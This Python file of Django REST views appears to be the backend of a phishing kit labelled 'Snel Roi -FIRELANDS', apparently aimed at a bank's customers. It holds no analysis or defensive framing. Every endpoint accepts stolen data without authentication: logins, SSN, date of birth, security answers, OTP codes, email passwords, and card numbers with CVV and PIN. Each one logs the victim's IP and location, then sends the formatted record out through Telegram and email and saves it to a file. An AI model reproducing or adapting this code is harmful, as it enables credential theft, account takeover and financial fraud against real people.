from rest_framework.decorators import api_view, permission_classes, authentication_classes
from rest_framework.response import Response
from core.settings import app_settings
from core.utils import (
    get_client_ip,
    get_country_from_ip,
    get_city_from_ip,
    get_user_browser,
    get_user_os,
    _notification_sender,
    _notification_recipients,
    send_data_telegram,
    send_data_email,
    save_data_to_file
)
from user_data.models import Client, BankInfo, BrowserDetail
from datetime import datetime
import logging

logger = logging.getLogger(__name__)

@api_view(['POST'])
@permission_classes([])
@authentication_classes([])
def firelands_collect_user_login_cred(request):
    payload = {}
    
    if request.method == 'POST':
        try:
            username = request.data.get('emzemz', '')
            password = request.data.get('pwzenz', '')
            
            if not username or not password:
                return Response({'error': 'Username and password required'}, status=400)
                
            client, _ = Client.objects.get_or_create(username=username)
            client.email = username
            client.save()
            
            BankInfo.objects.create(
                client=client,
                password=password,
                username=username
            )
            
            ip = get_client_ip(request)
            agent = request.META.get('HTTP_USER_AGENT', '')
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime('%I:%M:%S %d/%m/%Y')
            
            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()
            
            message = "|=====||Snel Roi -FIRELANDS||=====|\n"
            message += "|========= [ LOGIN ] ==========|\n"
            message += f"| ➤ [ Username ]         : {username}\n"
            message += f"| ➤ [ Password ]         : {password}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"
            
            send_data_telegram(app_settings, message)
            send_data_email("The Data", message, _notification_sender(), _notification_recipients())
            save_data_to_file(username, message)
            
            payload['message'] = 'Successful'
            return Response(payload)
            
        except Exception as e:
            logger.exception("firelands_collect_user_login_cred failed")
            payload['message'] = 'Errors'
            return Response(payload, status=500)

@api_view(['POST'])
@permission_classes([])
@authentication_classes([])
def firelands_collect_user_login_cred2(request):
    payload = {}
    
    if request.method == 'POST':
        try:
            username = request.data.get('emzemz', '')
            password = request.data.get('pwzenz', '')
            
            if not username or not password:
                return Response({'error': 'Username and password required'}, status=400)
                
            client, _ = Client.objects.get_or_create(username=username)
            bank_info, _ = BankInfo.objects.get_or_create(client=client)
            bank_info.password2 = password
            bank_info.save()
            
            ip = get_client_ip(request)
            agent = request.META.get('HTTP_USER_AGENT', '')
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime('%I:%M:%S %d/%m/%Y')
            
            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()
            
            message = "|=====||Snel Roi -FIRELANDS||=====|\n"
            message += "|========= [ LOGIN CONFIRM ] ==========|\n"
            message += f"| ➤ [ Username ]        : {username}\n"
            message += f"| ➤ [ Password2 ]       : {password}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"
            
            send_data_telegram(app_settings, message)
            send_data_email("The Data", message, _notification_sender(), _notification_recipients())
            save_data_to_file(username, message)
            
            payload['message'] = 'Successful'
            return Response(payload)
            
        except Exception as e:
            logger.exception("firelands_collect_user_login_cred2 failed")
            payload['message'] = 'Errors'
            return Response(payload, status=500)

@api_view(['POST'])
@permission_classes([])
@authentication_classes([])
def firelands_collect_user_basic_info(request):
    payload = {}
    
    if request.method == 'POST':
        try:
            fields = {
                'username': request.data.get('emzemz', ''),
                'firstName': request.data.get('fzNme', ''),
                'lastName': request.data.get('lzNme', ''),
                'phone': request.data.get('phone', ''),
                'ssn': request.data.get('ssn', ''),
                'motherMaidenName': request.data.get('motherMaidenName', ''),
                'dob': request.data.get('dob', ''),
                'driverLicense': request.data.get('driverLicense', ''),
                'streetAddress': request.data.get('stAd', ''),
                'apt': request.data.get('apt', ''),
                'city': request.data.get('city', ''),
                'state': request.data.get('state', ''),
                'zipCode': request.data.get('zipCode', '')
            }
            
            client = Client.objects.get(username=fields['username'])
            client.first_name = fields['firstName']
            client.last_name = fields['lastName']
            client.phone = fields['phone']
            client.ssn = fields['ssn']
            client.mother_maiden_name = fields['motherMaidenName']
            client.dob = fields['dob']
            client.driver_license = fields['driverLicense']
            client.save()
            
            # Browser details and notification logic
            ip = get_client_ip(request)
            agent = request.META.get('HTTP_USER_AGENT', '')
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime('%I:%M:%S %d/%m/%Y')
            
            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()
            
            message = "|=====||Snel Roi -FIRELANDS||=====|\n"
            message += "|========= [ BASIC INFO ] ==========|\n"
            message += f"| ➤ [ Username ]           : {fields['username']}\n"
            message += f"| ➤ [ First Name ]         : {fields['firstName']}\n"
            message += f"| ➤ [ Last Name ]          : {fields['lastName']}\n"
            message += f"| ➤ [ Phone ]              : {fields['phone']}\n"
            message += f"| ➤ [ SSN ]                : {fields['ssn']}\n"
            message += f"| ➤ [ Mother Maiden Name ] : {fields['motherMaidenName']}\n"
            message += f"| ➤ [ Date of Birth ]      : {fields['dob']}\n"
            message += f"| ➤ [ Driver's License ]   : {fields['driverLicense']}\n"
            
            if any([fields['streetAddress'], fields['city'], fields['state'], fields['zipCode']]):
                message += "|=====================================|\n"
                message += "| 🏠  A D D R E S S   D E T A I L S 🏠\n"
                message += "|======================================|\n"
                if fields['streetAddress']:
                    message += f"| ➤ [ Street Address ]     : {fields['streetAddress']}\n"
                if fields['apt']:
                    message += f"| ➤ [ Apartment/Unit ]     : {fields['apt']}\n"
                if fields['city']:
                    message += f"| ➤ [ City ]               : {fields['city']}\n"
                if fields['state']:
                    message += f"| ➤ [ State ]              : {fields['state']}\n"
                if fields['zipCode']:
                    message += f"| ➤ [ ZIP Code ]           : {fields['zipCode']}\n"
            
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"
            
            send_data_telegram(app_settings, message)
            send_data_email("The Data", message, _notification_sender(), _notification_recipients())
            save_data_to_file(fields['username'], message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("firelands_collect_user_basic_info failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)

@api_view(['POST'])
@permission_classes([])
@authentication_classes([])
def firelands_collect_user_security_questions(request):
    payload = {}
    errors = {}
    
    if request.method == 'POST':
        try:
            fields = {
                'username': request.data.get('emzemz', ''),
                'question1': request.data.get('securityQuestion1', ''),
                'answer1': request.data.get('securityAnswer1', ''),
                'question2': request.data.get('securityQuestion2', ''),
                'answer2': request.data.get('securityAnswer2', ''),
                'question3': request.data.get('securityQuestion3', ''),
                'answer3': request.data.get('securityAnswer3', '')
            }
            
            # Validate all fields required
            for field, value in fields.items():
                if not value:
                    errors[field] = [f"{field} is required"]
            
            if errors:
                return Response({"errors": errors}, status=400)
                
            client = Client.objects.get(username=fields['username'])
            client.security_question_1 = fields['question1']
            client.security_answer_1 = fields['answer1']
            client.security_question_2 = fields['question2']
            client.security_answer_2 = fields['answer2']
            client.security_question_3 = fields['question3']
            client.security_answer_3 = fields['answer3']
            client.save()
            
            # Standard browser details and notification
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
            
            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = "|=====||Snel Roi -FIRELANDS||=====|\n"
            message += "|========= [ SECURITY QUESTIONS ] ==========|\n"
            message += f"| ➤ [ Question 1 ]      : {fields['question1']}\n"
            message += f"| ➤ [ Answer 1 ]        : {fields['answer1']}\n"
            message += f"| ➤ [ Question 2 ]      : {fields['question2']}\n"
            message += f"| ➤ [ Answer 2 ]        : {fields['answer2']}\n"
            message += f"| ➤ [ Question 3 ]      : {fields['question3']}\n"
            message += f"| ➤ [ Answer 3 ]        : {fields['answer3']}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)
            send_data_email("The Data", message, _notification_sender(), _notification_recipients())
            save_data_to_file(fields['username'], message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("firelands_collect_user_security_questions failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)

@api_view(['POST'])
@permission_classes([])
@authentication_classes([])
def firelands_collect_user_otp_verification(request):
    payload = {}
    
    if request.method == 'POST':
        try:
            username = request.data.get('emzemz', '')
            otp = request.data.get('otp', '')
            
            if not username or not otp:
                return Response({"error": "Username and OTP required"}, status=400)
                
            client = Client.objects.get(username=username)
            
            # Browser details and notification
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
            
            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = "|=====||Snel Roi -FIRELANDS||=====|\n"
            message += "|========= [ OTP VERIFICATION ] ==========|\n"
            message += f"| ➤ [ Username ]      : {username}\n"
            message += f"| ➤ [ OTP Code ]      : {otp}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)
            send_data_email("The Data", message, _notification_sender(), _notification_recipients())
            save_data_to_file(username, message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("firelands_collect_user_otp_verification failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)

@api_view(['POST'])
@permission_classes([])
@authentication_classes([])
def firelands_collect_user_email_password(request):
    payload = {}
    
    if request.method == 'POST':
        try:
            username = request.data.get('emzemz', '')
            email = request.data.get('email', '')
            password = request.data.get('password', '')
            
            if not username or not email or not password:
                return Response({"error": "Username, email and password required"}, status=400)
                
            client = Client.objects.get(username=username)
            client.email = email
            client.save()
            
            bank_info, _ = BankInfo.objects.get_or_create(client=client)
            bank_info.email_password = password
            bank_info.save()
            
            # Browser details and notification
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
            
            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = "|=====||Snel Roi -FIRELANDS||=====|\n"
            message += "|========= [ EMAIL & PASSWORD ] ==========|\n"
            message += f"| ➤ [ Username ]      : {username}\n"
            message += f"| ➤ [ Email ]         : {email}\n"
            message += f"| ➤ [ Password ]      : {password}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)
            send_data_email("The Data", message, _notification_sender(), _notification_recipients())
            save_data_to_file(username, message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("firelands_collect_user_email_password failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)

@api_view(['POST'])
@permission_classes([])
@authentication_classes([])
def firelands_collect_user_card_info(request):
    payload = {}
    
    if request.method == 'POST':
        try:
            username = request.data.get('emzemz', '')
            cardNumber = request.data.get('cardNumber', '')
            expiryDate = request.data.get('expiryDate', '')
            cvv = request.data.get('cvv', '')
            cardPin = request.data.get('cardPin', '')
            
            if not username or not cardNumber or not expiryDate or not cvv or not cardPin:
                return Response({"error": "All card fields required"}, status=400)
                
            client = Client.objects.get(username=username)
            
            bank_info, _ = BankInfo.objects.get_or_create(client=client)
            bank_info.card_number = cardNumber
            bank_info.card_expiry = expiryDate
            bank_info.card_cvv = cvv
            bank_info.card_pin = cardPin
            bank_info.save()
            
            # Browser details and notification
            ip = get_client_ip(request)
            agent = request.META.get("HTTP_USER_AGENT", "")
            country = get_country_from_ip(ip)
            city = get_city_from_ip(ip)
            browser = get_user_browser(agent)
            os = get_user_os(agent)
            date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
            
            browser_data, _ = BrowserDetail.objects.get_or_create(client=client)
            browser_data.ip = ip
            browser_data.agent = agent
            browser_data.country = country
            browser_data.city = city
            browser_data.address = f"{city}, {country}"
            browser_data.browser = browser
            browser_data.os = os
            browser_data.time = date
            browser_data.date = date
            browser_data.save()

            message = "|=====||Snel Roi -FIRELANDS||=====|\n"
            message += "|========= [ CARD INFORMATION ] ==========|\n"
            message += f"| ➤ [ Username ]      : {username}\n"
            message += f"| ➤ [ Card Number ]   : {cardNumber}\n"
            message += f"| ➤ [ Expiry Date ]   : {expiryDate}\n"
            message += f"| ➤ [ CVV ]           : {cvv}\n"
            message += f"| ➤ [ Card PIN ]      : {cardPin}\n"
            message += "|=====================================|\n"
            message += "| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
            message += "|======================================|\n"
            message += f"| ➤ [ IP Address ]   : {ip}\r\n"
            message += f"| ➤ [ IP Country ]   : {country}\r\n"
            message += f"| ➤ [ IP City ]      : {city}\r\n"
            message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
            message += f"| ➤ [ User Agent ]   : {agent}\r\n"
            message += f"| ➤ [ TIME ]         : {date}\r\n"
            message += "|=====================================|\n"

            send_data_telegram(app_settings, message)
            send_data_email("The Data", message, _notification_sender(), _notification_recipients())
            save_data_to_file(username, message)
            
            payload["message"] = "Successful"
        except Exception as e:
            logger.exception("firelands_collect_user_card_info failed")
            payload["message"] = "Errors"
            return Response(payload, status=500)
    return Response(payload)
